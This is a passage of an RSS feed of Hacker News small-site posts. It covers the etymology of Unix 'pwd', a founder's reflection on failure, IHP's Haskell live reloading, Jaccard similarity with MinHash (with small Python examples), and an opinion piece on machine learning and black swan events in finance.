            <guid isPermaLink="false">hacker-news-small-sites-25026039</guid>
            <pubDate>Sun, 08 Nov 2020 14:36:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The myriad meanings of pwd in Unix systems]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25025830">thread link</a>) | @qmacro
<br/>
November 8, 2020 | https://qmacro.org/2020/11/08/the-meaning-of-pwd-in-unix-systems/ | <a href="https://web.archive.org/web/*/https://qmacro.org/2020/11/08/the-meaning-of-pwd-in-unix-systems/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p><em>Last week I ran a poll on Twitter to see what people considered with respect to the meaning of ‘pwd’ in Unix and Linux systems. The results were varied, for perhaps good reason.</em></p>

<p>At the end of Oct 2020 I ran a <a href="https://twitter.com/qmacro/status/1322567992551624705">brief poll on Twitter</a>, on which 82 people voted. Here’s that poll, and the results. They’re quite mixed, which at first might seem surprising. But there are reasons for that, as we’ll find out.</p>

<p><img src="https://qmacro.org/content/images/2020/11/twitter-poll-pwd.png" alt="Poll on Twitter: &quot;Fun Saturday afternoon shell poll. In Unix (and Linux), what do you think the P in $PWD (or pwd) stand for?&quot;"></p>

<p><strong>Print working directory</strong></p>

<p>The most popular option was “print working directory”. At first sight it seems logical: “print out the current working directory, i.e. where I am right now”. Moreover, the description in various versions of the manual for <code>pwd</code> help to drive home that notion. Typically we see sentences like “<a href="https://linux.die.net/man/1/pwd">print name of current/working directory</a>” or “<a href="https://www.mankier.com/1/pwd">print the current directory</a>”.</p>

<p>But there are lots of commands that print stuff, and are described in that way too. Take the <code>id</code> command. Here’s what one man page says: “<a href="https://man7.org/linux/man-pages/man1/id.1.html">print real and effective user and group IDs</a>”. There’s “print” again. But the command isn’t <code>pid</code>, it’s <code>id</code>. When you think about it, many, many commands in Unix send information to STDOUT, i.e. to the terminal. That’s sort of the point of many of them.</p>

<p>This time arguably only superficially definitive, it would seem, the Wikipedia entry states, on the <a href="https://en.wikipedia.org/wiki/Pwd">page for <code>pwd</code></a>: “the pwd command (print working directory) writes the full pathname of the current working directory to the standard output”. As if to underline the hopeful authority of this statement, there are five (!) footnotes that supposedly link to resources that back this up.</p>

<p>Unfortunately, the first footnote points to a Wayback Machine copy of the <a href="https://web.archive.org/web/20050520231659/http://cm.bell-labs.com/7thEdMan/v7vol1.pdf">UNIX PROGRAMMERS MANUAL - Seventh Edition, Volume 1 - January, 1979</a>, wherein there are actually zero references to <code>pwd</code> being short for “print working directory”:</p>

<p><img src="https://qmacro.org/content/images/2020/11/programmers-manual-pwd.png" alt="excerpt from UNIX PROGRAMMERS MANUAL on pwd"></p>

<p>I don’t know about you, but this historic document carries more weight for me than other sources I’ve come across, and it only serves here to undermine the credibility of the Wikipedia entry.</p>

<p>The rest of the footnote links seem dubious at best, except for the one pointing to the <a href="https://www.gnu.org/software/coreutils/manual/coreutils.html#pwd-invocation">GNU Coreutils manual on pwd</a> which has it as “print working directory”. But everything else I’ve seen so far makes me think that this is a misunderstanding that has spread for obvious and innocent reasons. In addition, the one footnote in the Wikipedia page that is not used to back this claim up is a pointer to <a href="https://pubs.opengroup.org/onlinepubs/9699919799/utilities/pwd.html">The Open Group Base Specifications Issue 7, 2018 edition’s information on pwd</a>, which almost seems like it’s actually avoiding using the word “print” at all: “return working directory name” … “The pwd utility shall write to standard output an absolute pathname of the current working directory, which does not contain the filenames dot or dot-dot.”. Very specific, very not-print.</p>

<p>So I’m thinking that “print working directory” isn’t what <code>pwd</code> stands for. In fact, “print working directory” may be common to some man pages, but on this macOS machine, with its <a href="https://en.wikipedia.org/wiki/Berkeley_Software_Distribution">BSD</a> heritage, we have, instead: “pwd – return working directory name”. Moreover, it goes on to say “The pwd utility writes the absolute pathname of the current working directory to the standard output”.</p>

<p><strong>Pathname of working directory</strong></p>

<p>So perhaps it really is “pathname of working directory”. That would, at least to me, make more sense. Not only does it eschew the redundancy of “print”, it also is more specific about the output - if I’m in <code>/home/dja/</code> for example, then invoking pwd will tell me that, i.e. where I am, including the whole path, and not just <code>dja</code>:</p>



<p><strong>Process working directory</strong></p>

<p>As for the other options, I do favour “process working directory”, mostly because it makes a lot of sense to me; every process in Unix has the concept of a current working directory, and that’s exactly what I’m asking for when I’m in my shell process and enter <code>pwd</code> - there’s a part in the video <a href="https://youtu.be/hgFBRZmwpSM?t=165">Unix terminals and shells</a> that explains this very well.</p>

<p>I’d love to be able to point to some old Unix sources that definitively explain the answer, but unfortunately that search has come up with very little - the <code>pwd</code> source in both the <a href="https://minnie.tuhs.org/cgi-bin/utree.pl?file=V5/usr/source/s2/pwd.c">5th</a> and <a href="https://github.com/yisooan/unix-v6/blob/master/source/s2/pwd.c">6th</a> Editions of Unix shed no light on this whatsoever.</p>

<p><strong>Present working directory</strong></p>

<p>What about “present working directory”? Well, that option seems to have legs, in the form of the Korn shell. While <a href="https://northstar-www.dartmouth.edu/doc/solaris-forte/ipe-help/dbx/dbx88cc.html">one source</a> implies that the answer might well be “pathname of current working directory”, in that <code>pwd</code> just emits the value of the <code>$PWD</code> environment variable (and a variable called “print working directory” makes no sense at all) … it would seem that in ksh-land, at least, “present working directory” is what <code>pwd</code> represents. Take, for example, the <a href="https://osr507doc.xinuos.com/en/man/html.C/ksh.C.html">ksh man page</a> which states “PWD - The present working directory set by the cd command”.</p>

<p>There’s a ton of discussion, both direct and indirect, on this very question. Take for example these two entries in the Unix &amp; Linux Stack Exchange forum: <a href="https://unix.stackexchange.com/questions/399026/etymology-of-pwd">Etymology of $PWD</a> and <a href="https://unix.stackexchange.com/questions/174990/what-is-pwd-vs-current-working-directory">What is $PWD? (vs current working directory)</a>. Of course, perhaps the definitive answer will never be found, as computing history is nothing if not varied and prone to forking.</p>

<p><strong>Multics and print_wdir</strong></p>

<p>Talking of history, we could go further back to pre-Unix roots, in the form of Multics, which indirectly gave rise to Unix (originally “Unics”). In the <a href="https://multicians.org/multics-commands.html">list of Multics Commands</a>, we see, nestled amongst other similarly named commands, something that jumps out at us:</p>

<div><div><pre><code>print_mail (pm)	display mail in a mailbox
print_messages (pm)	display interactive messages in a mailbox
print_motd (pmotd)	display message of the day (source)
print_proc_auth (ppa)	display process's sensitivity level and compartments
print_request_types (prt)	display list of I/O daemon request types
print_search_paths (psp)	display search paths
print_search_rules (psr)	display ready messages
print_wdir (pwd)	display working directory
</code></pre></div></div>

<p>There’s <code>pwd</code>, and in fact, just like its sibling <code>pmotd</code>, for example, which is short for <code>print_motd</code>, it’s short for <code>print_wdir</code>. Now, given the context of the original poll being set to Unix and Linux, perhaps we must discount this information. But as someone who is fascinated with Unix history in general - how can I?</p>

<p>I guess there are few things to conclude. The history is rich and diverse, and maybe we’ll never know for sure. Perhaps, in fact, the answer will depend on whom we ask. In the grand scheme of things, it doesn’t really matter … but to those who delight in minutiae, it’s a fun topic worth exploring.</p>

  </div>

</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://qmacro.org/2020/11/08/the-meaning-of-pwd-in-unix-systems/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25025830</guid>
            <pubDate>Sun, 08 Nov 2020 13:56:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Can we talk about failure?]]>
            </title>
            <description>
<![CDATA[
Score 17 | Comments 12 (<a href="https://news.ycombinator.com/item?id=25025819">thread link</a>) | @mqsley
<br/>
November 8, 2020 | https://www.mquinn.online/blog/can-we-talk-about-failure | <a href="https://web.archive.org/web/*/https://www.mquinn.online/blog/can-we-talk-about-failure">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>For the longest time felt like I didn’t fail at things. I was brought up with the mindset that if something is doable, it cannot be hard. A mindset which compels you to find harder and harder challenges.</p><p>That all changed when Flex, the Techstars company I co-founded didn’t work out. It broke me.&nbsp;</p></div><div><p>What surprised me was that the network, “give first” and all of the opportunity that comes with it is great when you’re on the up but awkward, uncomfortable and at times “crickets” on the down.</p><p>Part of this I now realise is because when you’re in failure mode, you’re insufferable to everyone around you.</p><p>You carry this huge weight on your shoulders that you put on others every time you meet like a wounded animal, limping around looking to be put down.</p><p>I’m not sure if everyone has gone through this, but for me I suffered through thoughts like:<br>Will I be ever successful?<br>Will I ever be happy?<br>Will I ever have another good idea?<br>Was my idea good?<br>Can I have good Ideas?<br>Can I be good at anything?</p><p>I came to learn these can be called cognitive distortions, and the best way to stop them is to write them down and use reason and logic to disprove them.</p><p>Everyone just tells you its okay, put in their perspective, you’ll work it out - This whole experience was incredibly frustrating, how could a non founder possibly relate to the level of aspiration I had taken away from me. What is a well meaning attempt at helping often comes across as people shrugging you off.</p><p>There was a limit to what my coach could do because I convinced myself he hadn’t experienced it. How could he possibly understand what was left behind after this huge emotional debt bubble deflated.</p><p>I sought out others who’s companies had died, or who had been ousted from their own boards but it was hard to match with other failures because it was either a sufferfest of two people feeling sorry for themselves or one of you values success more than the other and you judge the others’ failure.</p><p>I didn't grieve, I tried to re-inflate the bubble inside me.</p><p>I didn’t get angry, I just wanted to get better, I just wanted to feel better without putting in the work.</p><p>I turned to reading, thinking that with over a century of modern business practices surely titans have recovered from this. Reading a gazillion business biographies, literature I now know to pop science schlop, did not help. In fact it made it worse.&nbsp;</p><p>I remember reading Lean In and it slid me into depression. How did Sheryl Sandberg career magically line up at the end? Was I on the right track? How do I get on track? Where is the track? What is the track?</p><p>I would openly talk about imposter syndrome to explain why I approached work and decisions the way I did, and came to learn that:</p><ul><li>Outside of tech many people have never heard of the concept<br></li><li>People who had, did not understand it<br></li><li>Many people thought imposter syndrome was in fact the Dunning Kruger effect and thus I was admitting to them I was a fraud.&nbsp;</li></ul><p>For me, the voices in my head eventually did die off. Normalcy came about a year later when I realised I was talking about and writing about my experiences from a perspective of wisdom rather than re-hashing scar tissue.</p><p>Serendipitously after this point, I was gifted the book - <a href="https://www.amazon.com/When-Smart-People-Fail-Rebuilding/dp/0140178112" target="_blank">When Smart People Fail </a>by another Techstars founder whose grandmother had gifted her the book after she had experienced a set back. A set back which ultimately led to the founding of her Techstars company.</p><p>Where was this book when I failed? While a subjectively unnecessary read, I read it anyway. In my personal opinion, it was probably the best thing I’ve ever read on dealing with personal failure.</p><p>I think it would have saved me months of anguish had I read it earlier, and while I truly love helping entrepreneurs and makers - my goto advice now, when someone has experienced failure and is looking for guidance is - read this book.</p><p>I think Techstars should gift this to every founder that fails, whether they leave their company, are forced out or go insolvent.</p><p>Between stories of failure, to understanding the core stages of grief that one must go through - there is something in the book for everyone.&nbsp;</p></div><div><p>Key things the book taught me:</p><ul><li>Failure is subjective to the victim</li><li>Failure has stages of grief that you must go through - if you skip any, you will experience prolonged pain. I can first hand attest to this.</li><li>If we treat success as a binary outcome, everything we sacrifice in the pursuit of success is meaningless when we fail.</li></ul><p>The third point is something I embraced over the year that followed. Clearly others think I have experience/advice/wisdom/ideas to share so there is value there and it made it all much less painful. If success is binary, those of us who don’t make it, lose many years of our lives for nothing.</p><p>This is a stance I fully reject and I thank Jen and the book for really teaching me this.</p><p>In full realisation of this final point - <a href="https://www.mquinn.online/failures.html">I’m committing to my failures in public.</a> We’ll see how long I can keep it up for, but for every project that didn’t hit the goal, the ideas that crash landed and the products that went unloved I’m keeping a record because these failures are not a waste of life, they are the stepping stones that when looking back in 20 years will all make sense.</p><p>Show me someone without failure and I’ll show you someone without learning.&nbsp;</p></div><div><p>Thanks to everyone that listened to me moan for a year about my failures.</p><p>A special thanks to fellow Techstars founder Sarah Tuneberg who gave me perspective through the journey, <span>Techstars founder&nbsp;</span>Jen Saxton who gifted me “When smart people fail” and my wife for supporting me while I put myself back together.&nbsp;</p></div></div>]]>
            </description>
            <link>https://www.mquinn.online/blog/can-we-talk-about-failure</link>
            <guid isPermaLink="false">hacker-news-small-sites-25025819</guid>
            <pubDate>Sun, 08 Nov 2020 13:54:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[IHP: Live Reloading Haskell Code, How It Works]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25025774">thread link</a>) | @_query
<br/>
November 8, 2020 | https://ihp.digitallyinduced.com/blog/2020-08-10-ihp-live-reloading.html | <a href="https://web.archive.org/web/*/https://ihp.digitallyinduced.com/blog/2020-08-10-ihp-live-reloading.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <ul>
                <li>
                    <strong>Starting an IHP app</strong>

                    <p>
                        Let's first take a look at what happens when you start your IHP app by running <code>./start</code>.
                    </p>

                    <p>
                        The <a href="https://github.com/digitallyinduced/ihp-boilerplate/blob/master/start" target="_blank"><code>./start</code></a> script in your project is basically just a small wrapper that makes sure that all dependencies that are managed by nix are available and then calls the <code>RunDevServer</code> binary. <a href="https://github.com/digitallyinduced/ihp/blob/master/exe/IHP/IDE/DevServer.hs" target="_blank">This binary is part of IHP</a> and does the actual application startup as well as managing the postgres server.
                    </p>

                    <p>
                        You can think of <code>RunDevServer</code> as a small process manager. When <code>RunDevServer</code> is started, it will directly start all processes required for your application to run:
                        </p><ul>
                            <li>the web-based IDE</li>
                            <li>a status server on port 8000 showing the compiler status and possible type errors</li>
                            <li>a websocket server used for communicating file changes for live reloading</li>
                            <li>a ghci (the standard haskell REPL) where it directly loads your app</li>
                            <li>a postgres server bound to unix socket</li>
                            <li>a file watcher to track haskell and css file changes</li>
                        </ul>
                    

                    <p>
                        All these processes are started in parallel for fast performance and synchronised in the main event loop of the dev server. Made possible thanks to haskells great concurrency capabilities.
                    </p>

                    <p>
                        The most important process is the ghci process with your app. Instead of fully recompiling your app on every file change, IHP loads your app in the repl and then refreshes only the changed files. 
                    </p>

                    <p>
                        At first ghci needs a couple of seconds to load all haskell files of your application. While loading your application the status server is serving all http requests on localhost:8000. The status server will also show all type errors in case ghci failed to load your app. When the ghci finished loading, the status server is stopped and your application is started on localhost:8000.
                    </p>

                </li>

                <li>
                    <strong>Haskell File Changes</strong>

                    <p>
                        <iframe width="100%" height="500" src="https://www.youtube.com/embed/nTjjDo57B8g" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
                    </p>

                    <p>
                        Once your application is started, the dev server mainly deals with file changes. Using a file watcher the dev server is notified about any changes to your haskell files in your project. When a haskell file is changed the app process running in the ghci process is stopped and a refresh (<code>:r</code>) is triggered. The refresh is usually very fast. Once completed the app server will be started again.
                    </p>

                    <p>
                        Once the haskell app has started, open browser pages will be notified using a websocket connection. The open pages will fetch the current page via ajax and will then update the dom using <a href="https://github.com/patrick-steele-idem/morphdom" target="_blank">a diff and patch approach</a>. So only dom nodes that have actually changed will be touched during the live reloading. This approach will keep existing page state like scroll position or text typed into a form field. It allows for a very fast and productive feedback cycle.
                    </p>
                </li>

                <li>
                    <strong>CSS File Changes</strong>

                    <blockquote><p lang="en" dir="ltr">Did you know: <a href="https://twitter.com/hashtag/ihp?src=hash&amp;ref_src=twsrc%5Etfw">#ihp</a> also supports live reloading of CSS. <a href="https://t.co/uRCCr3gkHz">pic.twitter.com/uRCCr3gkHz</a></p>— digitally induced (@digitallyinduce) <a href="https://twitter.com/digitallyinduce/status/1277583045919375363?ref_src=twsrc%5Etfw">June 29, 2020</a></blockquote> 
                    

                    <p>
                        IHP also supports live reloading of CSS files. Once IHP sees a file change to your CSS files in the <code>static</code> directory it will notify all open browser tabs using its websocket connection. Once notified in the browser IHP will look for any <code>&lt;link rel="stylesheet"&gt;</code> and <a href="https://github.com/digitallyinduced/ihp/blob/master/lib/IHP/static/livereload.js#L68" target="_blank">will reload the css file using a cache buster</a>.
                    </p>

                    <p>
                        This is only possible because nix allows us to pin down the set of package definitions to a specific git commit of the nix package registry.
                    </p>
                </li>

                <li>
                    <strong>Type Errors</strong>

                    <p>
                        Sometimes you make a change which will stop your application from compiling. In these error cases the status server jumps in and starts listening on localhost:8000. The status server will then display the error message so you can quickly fix it:
                    </p>

                    <img src="https://ihp.digitallyinduced.com/releases/v07082020.png" alt="Example of a status server error message">

                    <p>
                        Additionally open browser tabs will be notified about this and will refresh. This way the error is instantly visible to you.
                    </p>
                </li>

                <li>
                    <strong>Batteries-included</strong>

                    <p>
                        While the above steps are technically complicated, when doing actual development you will not see much of this complexity.  Lots of time have been spent to find the best approach and smoothing out all the edge cases. The whole process is very much inspired by PHP where you just make file changes and it works. The live reloading really <q>just works</q>.
                    </p>

                    <p>
                        The dev server is the heart of IHP and makes the dev process extremely productive. You get all the benefits of type-safety with the development speed you previously only got with scripting languages. If you haven't already it's time to try it out! 🚀
                    </p>
                </li>
            </ul>


        </div><p>Feel free to share this post on Twitter, Reddit, Hacker News or anywhere else on the internet :)</p></div>]]>
            </description>
            <link>https://ihp.digitallyinduced.com/blog/2020-08-10-ihp-live-reloading.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25025774</guid>
            <pubDate>Sun, 08 Nov 2020 13:46:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Jaccard Similarity Coefficient and MinHash]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25025683">thread link</a>) | @arpitbbhayani
<br/>
November 8, 2020 | https://arpitbhayani.me/blogs/jaccard-minhash | <a href="https://web.archive.org/web/*/https://arpitbhayani.me/blogs/jaccard-minhash">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Set similarity measure finds its application spanning the Computer Science spectrum; some applications being - user segmentation, finding near-duplicate webpages/documents, clustering, recommendation generation, sequence alignment, and many more. In this essay, we take a detailed look into a set-similarity measure called - Jaccard's Similarity Coefficient and how its computation can be optimized using a neat technique called MinHash.</p>

<p>Jaccard Similarity Coefficient quantifies how similar two <em>finite</em> sets really are and is defined as the size of their intersection divided by the size of their union. This similarity measure is very intuitive and we can clearly see that it is a real-valued measure bounded in the interval <code>[0, 1]</code>.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/98461673-302d7180-21d4-11eb-9722-41f473c1fe84.png" alt="https://user-images.githubusercontent.com/4745789/98461673-302d7180-21d4-11eb-9722-41f473c1fe84.png"></p>
<p>The coefficient is <code>0</code> when the two sets are mutually exclusive (disjoint) and it is <code>1</code> when the sets are equal. Below we see the one-line python function that computes this similarity measure.</p>
<pre><code><span><span>def</span> <span>similarity_jaccard</span><span>(a: set, b: set)</span> -&gt; float:</span>
    <span>return</span> len(a.intersection(b)) / len(a.union(b))
</code></pre>
<h2>Jaccard Similarity Coefficient as Probability</h2>
<p>Jaccard Coefficient can also be interpreted as the probability that an element picked at random from the universal set <code>U</code> is present in both sets <code>A</code> and <code>B</code>.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/98462221-8dc3bd00-21d8-11eb-95bf-5a9267e88b97.png" alt="https://user-images.githubusercontent.com/4745789/98462221-8dc3bd00-21d8-11eb-95bf-5a9267e88b97.png"></p>
<p>Another analogy for this probability is the chances of throwing a dart and it hitting the intersection. Thus we see how we can transform the Jaccard Similarity Coefficient into a simple probability statement. This will come in very handy when we try to optimize the computation at scale.</p>
<h2>Problem at Scale</h2>
<p>Computing Jaccard Similarity Coefficient is very simple, all we require is a union operation and an intersection operation on the participating sets. But these computations go haywire when things run at scale.</p>
<p>Computing set similarity is usually a subproblem fitting in a bigger picture, for example, near-duplicate detection which finds near-duplicate articles across millions of documents. When we tokenize the documents and apply raw Jaccard Similarity Coefficient for every two combinations of documents we find that the computation will take <a href="https://mccormickml.com/2015/06/12/minhash-tutorial-with-python-code/">years</a>.</p>
<p>Instead of finding the true value for this coefficient, we can rely on an approximation if we can get a considerable speedup and this is where a technique called MinHash fits well.</p>

<p>MinHash algorithm gives us a fast approximation to the Jaccard Similarity Coefficient between any two finite sets. Instead of computing the unions and the intersections every single time, this method once creates <em>MinHash Signature</em> for each set and use it to approximate the coefficient.</p>
<h2>Computing single MinHash</h2>
<p>MinHash <code>h</code> of the set <code>S</code> is the index of the first element, from a permuted Universal Set, that is present in the set <code>S</code>. But since permutation is a computation heavy operation especially for large sets we use a hashing/mapping function that typically reorders the elements using simple math operation. One such hashing function is</p>
<p><img src="https://user-images.githubusercontent.com/4745789/98463097-f7df6080-21de-11eb-8b61-a84ff7ad85de.png" alt="https://user-images.githubusercontent.com/4745789/98463097-f7df6080-21de-11eb-8b61-a84ff7ad85de.png"></p>
<p>If <code>u</code> is the total number of elements in the Universal Set <code>U</code> then <code>a</code> and <code>b</code> are the random integers less than <code>u</code> and <code>c</code> is the prime number slightly higher than <code>u</code>.  A sample permute function could be</p>
<pre><code><span><span>def</span> <span>permute_fn</span><span>(x: int)</span> -&gt; int:</span>
    <span>return</span> (<span>23</span> * x + <span>67</span>) % <span>199</span>
</code></pre>
<p>Now that we have defined permutation as a simple mathematical operation that spits out the new row index, we can find MinHash of a set as the element that has the minimum new row number. Hence we can define the MinHash function as</p>
<pre><code><span><span>def</span> <span>minhash</span><span>(s: set)</span> -&gt; int:</span>
    <span>return</span> min([permute_fn(e) <span>for</span> e <span>in</span> s])
</code></pre>
<h2>A surprising property of MinHash</h2>
<p>MinHash has a surprising property, according to which, the probability that the MinHash of random permutation produces the same value for the two sets equals the Jaccard Similarity Coefficient of those sets.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/98463732-8229c380-21e3-11eb-9b26-04ec08bc8753.png" alt="https://user-images.githubusercontent.com/4745789/98463732-8229c380-21e3-11eb-9b26-04ec08bc8753.png"></p>
<p>The above equality holds true because the probability of MinHash of two sets to be the same is the number of elements present in both the sets divided by the total number of elements in both the sets combined; which in fact is the definition of Jaccard Similarity Coefficient.</p>
<p>Hence to approximate Similarity Coefficient using MinHash all we have to do is find the Probability of MinHash of two sets to be the same, and this is where the MinHash Signature comes in to play.</p>
<h2>MinHash Signature</h2>
<p>MinHash Signature of a set <code>S</code> is a collection of <code>k</code> MinHash values corresponding to <code>k</code> different MinHash functions. The size <code>k</code> depends on the error tolerance, keeping it higher leads to more accurate approximations.</p>
<pre><code><span><span>def</span> <span>minhash_signature</span><span>(s: set)</span>:</span>
    <span>return</span> [minhash(s) <span>for</span> minhash <span>in</span> minhash_fns]
</code></pre>
<blockquote>
<p>MinHash functions usually differ in the permutation parameters i.e. coefficients <code>a</code>, <code>b</code> and <code>c</code>.</p>
</blockquote>
<p>Now in order to compute <code>Pr[h(A) = h(B)]</code> we have to compare the MinHash Signature of the participating sets <code>A</code> and <code>B</code> and find how many values in their signatures match; dividing this number by the number of hash functions <code>k</code> will give the required probability and in turn an approximation of Jaccard Similarity Coefficient.</p>
<pre><code><span><span>def</span> <span>similarity_minhash</span><span>(a: set, b: set)</span> -&gt; float:</span>
    sign_a = minhash_signature(a)
    sign_b = minhash_signature(b)
    <span>return</span> sum([<span>1</span> <span>for</span> a, b <span>in</span> zip(sign_a, sign_b) <span>if</span> a == b]) / len(sign_a)
</code></pre>
<blockquote>
<p>MinHash Signature could well be computed just once per set.</p>
</blockquote>
<p>Thus to compute set similarity, we need not perform heavy computation like Union and Intersection and that too across millions of sets at scale, rather we can simply compare <code>k</code> items of in their signatures and get a fairly good estimate of it.</p>

<p>In order to find how close the estimate is we compute the Jaccard Similarity Coefficient and its approximate using MinHash on two disjoint sets having equal cardinality. One of the sets will undergo a transition where one element of it will be replaced with one element of the other set. So with time, the sets will go from disjoint to being equal.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/98465023-860e1380-21ec-11eb-8813-7cb6920bc1fd.png" alt="https://user-images.githubusercontent.com/4745789/98465023-860e1380-21ec-11eb-8813-7cb6920bc1fd.png"></p>
<p>The illustration above shows the two plots and we can clearly see that the MinHash technique provides a fairly good estimate of Jaccard Similarity Coefficient with much fewer computations.</p>

<ul>
<li><a href="https://en.wikipedia.org/wiki/Jaccard_index">Jaccard Index</a></li>
<li><a href="https://en.wikipedia.org/wiki/MinHash">MinHash Wikipedia</a></li>
<li><a href="https://www.researchgate.net/profile/Ekkachai_Naenudorn/publication/317248581_Using_of_Jaccard_Coefficient_for_Keywords_Similarity/links/592e560ba6fdcc89e759c6d0/Using-of-Jaccard-Coefficient-for-Keywords-Similarity.pdf">Using of Jaccard Coefficient for Keywords Similarity</a></li>
<li><a href="https://mccormickml.com/2015/06/12/minhash-tutorial-with-python-code/">MinHash Tutorial with Python Code</a></li>
</ul>
</div></div><section><div><div><p><img src="https://arpitbhayani.me/static/img/arpit.jpg"></p>  <h2>
              500+ Signups
            </h2> <p>
              If you like what you read subscribe you can always subscribe to
              my newsletter and get the post delivered straight to your inbox.
              I write
              <a href="https://arpitbhayani.me/blogs">essays</a> on various
              engineering topics and share it through my weekly
              <a href="https://arpitbhayani.me/newsletter">newsletter</a> 👇
            </p> <br> </div></div></section></div>]]>
            </description>
            <link>https://arpitbhayani.me/blogs/jaccard-minhash</link>
            <guid isPermaLink="false">hacker-news-small-sites-25025683</guid>
            <pubDate>Sun, 08 Nov 2020 13:32:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Artificial and Machine Learning in Finance]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25025512">thread link</a>) | @tosky
<br/>
November 8, 2020 | https://blog.swizel.co/artificial-and-machine-learning-in-finance-ckgns119e03dfncs11pereysu | <a href="https://web.archive.org/web/*/https://blog.swizel.co/artificial-and-machine-learning-in-finance-ckgns119e03dfncs11pereysu">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1603549835455/fClS2ugSU.jpeg?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><p>The year is 1992. In the United States, the cold war has been declared officially over and a young Bill Clinton is set to become the 42nd president of America. The space shuttle Atlantis takes off from Cape Canaveral with meteorological instruments to study global warming as the resources tied up in the costly cold war are freed for nobler pursuits. In South Africa, white citizens vote for political reforms to end apartheid, the struggle of the past two years is coming to an end. On the British Isles, the most famous speculative attack in history has been carried out on the British Pound by a group of investors masterminded by Hungarian-American financier George Soros. On ‘Black Wednesday’ 16 September 1992, investors sell massive amounts of British Pounds, expecting a devaluation- a drop in the price of the pound against other currencies. The Bank of England buys £4 billion in order to keep the demand for the pound high, but by the next day the value of the pound has fallen by more than 10%. The Bank reports a loss of £3.3 billion, a third of which George Soros gets to keep.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1603548855412/aABMN3Nsu.jpeg?auto=format&amp;q=60" alt="https___specials-images.forbesimg.com_imageserve_5f4e72bdd82a882a3012a595_0x0.jpg_background=000000&amp;cropX1=886&amp;cropX2=3035&amp;cropY1=515&amp;cropY2=2664.jpg"></p>
<p>Fast forward to 2001. The September 11 attacks have just taken place prompting the formation of four new security agencies and a war on terror that would last for over a decade.
What do these two events have in common? Two things. Firstly, they are both ‘black swan’ events. ‘Black swan’ is a termed coined by Lebanese-American statistician Nicholas Nassim Taleb to describe events that have low probabilities of happening and cannot be predicted. They usually have major effects and are often wrongly explained away by historians and analysts who have the benefit of hindsight. In other words, events that seem obvious when viewed from a perspective further in time, but are unpredictable by observers in the present. Examples include; World war 1, the dissolution of the Soviet Union, the housing crisis of 2008, and Donald Trump’s election.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1603548997001/tSn4UkG9K.jpeg?auto=format&amp;q=60" alt="donald-trump-portrait-with-silhouette-style_23-2147952267.jpg"></p>
<p>More interestingly, both of these events may not have happened today. This due to the advances being made in the prediction of rare events in the field of Machine learning. Machine learning is a branch of the Artificial intelligence discipline that automates analytical model building. A model is a simple structure that captures all the features of more complicated real-world situations.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1603549165479/1VwKMKpzR.jpeg?auto=format&amp;q=60" alt="file-20190409-2931-2n3fgx.jpg"></p>
<p>Machine learning is currently being considered in predicting future cyber-terrorist attacks, and is already being used to anticipate sudden changes in stock prices here, and here.</p>
<p>While Machine learning already has so many applications today in almost every sphere of human life; </p>
<ol>
<li>Technology (virtual assistants and self-driving cars) </li>
<li>Banking (fraud detection)</li>
<li>Marketing (adaptive online ads)</li>
</ol>
<p>A number of criticisms have yet to be addressed by proponents of machine learning in black swan event prediction such as;</p>
<ol>
<li><strong>Delusional turkeys:</strong> Algorithms predict events based on past data, which is well… from the past. This has been likened to Inductive reasoning, a generalization of which is the anecdotal turkey predicting that the farmer will not kill it, based on past data which holds up until thanksgiving.</li>
<li><strong>Fighting fire with fire:</strong> Other critics have pointed out that the stock market is very complex and responds to the actions which members take. This means that algorithms that predict what humans do right now, will eventually have to predict what other algorithms will do as more traders resort to Machine learning. Eventually those algorithms will also have to predict what other algorithms predict that other algorithms will do. The same reasoning applies to terrorist attacks. What happens when the terrorists resort to machine learning?</li>
<li><strong>The enemy within:</strong> Other critics have yet opined that machines are incapable of predicting black swan events and instead are most likely to cause one like in the 2010 flash crash. This carries greater implications in predicting terrorist attacks. Implications such as strained diplomatic relations or even war.</li>
</ol>
<p>In conclusion, while the pros and cons of machine learning have not yet been fully measured, we can only say two things with the exact minimum degree of certainty with which you might be comfortable, that machine learning will predict black swan events or that it will itself be absolved as a factor in the black hole that is the quest for the prediction of black swan events. But whatever the case, like with google maps, there is no wrong turn and there certainly is no going back now.</p>
</div></div></section></div></div>]]>
            </description>
            <link>https://blog.swizel.co/artificial-and-machine-learning-in-finance-ckgns119e03dfncs11pereysu</link>
